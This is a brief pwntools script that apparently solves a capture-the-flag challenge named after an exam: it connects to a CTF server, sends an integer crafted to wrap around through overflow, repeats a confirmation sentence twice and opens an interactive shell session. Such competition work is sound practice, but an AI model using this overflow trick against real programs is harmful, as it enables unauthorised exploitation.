from pwn import *

p = remote("challs.actf.co", "31322")

num = 0 - (0x7ffffffe + 1) & 0xFFFFFFFF;
p.sendline(f"{num - 2}".encode())
log.info(f"{num = :#x}")

for _ in range(2):
    p.sendline(b"I confirm that I am taking this exam between the dates 5/24/2024 and 5/27/2024. I will not disclose any information about any section of this exam.")

p.interactive()